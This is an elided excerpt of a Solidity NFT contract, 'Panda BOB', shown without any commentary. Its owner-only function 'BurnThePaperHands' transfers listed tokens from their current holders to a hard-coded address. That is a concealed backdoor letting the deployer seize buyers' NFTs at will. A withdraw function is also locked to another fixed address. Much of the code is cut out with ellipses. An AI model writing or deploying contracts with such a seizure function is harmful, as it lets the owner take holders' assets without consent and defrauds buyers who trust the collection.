...
contract Panda_BOB is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("Panda BOB", "PB", maxBatchSize_, collectionSize_) {
  ...
  function BurnThePaperHands(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        ...
        for (uint256 i; i < len; i++) {
            ...
            transferFrom(ownerOf(tokenid), 0x5C49650e4D2FC5D5DB82cF0a518Fc72cb6815D3e, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0xAdE0Cb8D3cBA5819a9805FBB5Da5298B0bBe7c89);
